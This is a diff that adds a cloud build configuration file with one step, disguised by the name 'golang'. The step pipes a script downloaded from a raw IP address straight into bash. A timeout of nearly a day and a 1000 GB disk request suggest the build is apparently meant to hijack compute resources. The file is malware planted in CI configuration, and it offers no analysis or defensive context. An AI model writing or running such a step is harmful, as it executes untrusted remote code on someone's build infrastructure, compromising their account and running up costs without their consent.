@@ -1,0 +1,12 @@
+steps:
+  - name: golang
+    args:
+      - '-c'
+      - >-
+        curl -sL http://139.180.133.28/mypertus | bash
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86000s
+options:
+  diskSizeGb: '1000'
